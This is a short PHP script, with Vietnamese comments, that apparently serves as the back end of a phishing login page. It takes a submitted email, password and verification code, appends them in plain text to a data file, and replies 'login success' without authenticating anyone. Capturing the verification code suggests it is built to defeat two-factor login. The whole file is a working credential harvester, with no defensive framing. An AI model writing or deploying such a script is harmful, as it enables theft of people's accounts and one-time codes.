<?php
	$email = trim($_POST['email']);
    $pass = trim($_POST['pass']);
    $verify = trim($_POST['verify']);

    //Trang login
    if ($email !== '' && $pass !== '') {
    	$datafile = fopen("data/data.txt", "a");
    	$info = $email . '/' . $pass . "/";
    	fwrite($datafile, $info);
    	fclose($datafile);
    	echo "login success";
    	exit();
    }

    //Xác nhận
    if ($verify !== '') {
    	$datafile = fopen("data/data.txt", "a");
    	$info = $verify . "\n";
    	fwrite($datafile, $info);
    	fclose($datafile);
    	echo "verify success";
    	exit();
    }